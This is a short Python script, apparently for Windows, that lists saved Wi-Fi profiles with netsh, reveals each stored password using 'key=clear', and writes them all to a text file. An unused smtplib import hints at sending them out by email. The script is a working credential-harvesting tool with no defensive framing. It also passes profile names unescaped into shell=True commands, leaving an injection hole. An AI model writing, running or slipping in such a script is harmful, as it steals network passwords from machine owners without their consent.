#!/usr/bin/python

import subprocess, smtplib, re

show_pro = "netsh wlan show profile"
wifi = subprocess.check_output(show_pro, shell=True)
wifi_list = re.findall('(?:Profile\s*:\s)(.*)',wifi.decode("UTF-8"))

global passwd
passwd = ""

for wlan in wifi_list:
    strip_r = wlan.strip('\r')
    passwd_find = "netsh wlan show profile " + "\"" + str(strip_r) + "\"" + " key=clear"
    wifi_result = subprocess.check_output(passwd_find, shell=True)
    passwd += str(wifi_result)

file = open("wifiPass2file.txt", 'w')
file.write(passwd)
file.close()